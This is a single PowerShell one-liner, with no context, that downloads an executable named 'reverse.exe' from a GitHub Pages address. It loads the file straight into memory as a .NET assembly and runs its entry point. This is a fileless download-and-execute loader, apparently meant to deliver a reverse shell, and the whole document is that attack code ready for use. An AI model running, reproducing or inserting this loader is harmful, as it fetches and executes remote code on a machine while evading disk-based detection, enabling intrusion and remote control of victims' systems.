$assemblyByte=(New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/reverse.exe");$assembly=[System.Reflection.Assembly]::Load($assemblyByte);$assembly.EntryPoint.Invoke($null, $null)
